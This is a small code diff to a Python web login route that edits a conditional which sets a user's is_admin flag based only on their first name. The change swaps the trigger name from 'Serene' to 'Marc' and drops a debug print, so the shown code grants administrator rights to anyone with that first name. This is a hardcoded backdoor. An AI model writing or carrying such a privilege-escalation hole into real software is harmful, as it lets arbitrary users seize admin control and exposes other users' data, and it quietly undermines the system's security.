@@ -14,8 +14,7 @@ def route(app):
             user_id = UserServiceImpl.get_user_credentials(user_credentials)
             # Gets user information from ID returned in previous step
             user = UserServiceImpl.get_user_by_id(user_id)
-            if user.first_name == 'Serene':
-                print("here")
+            if user.first_name == 'Marc':
                 user.is_admin = True
             response = jsonify(user.json())
             return response, 200
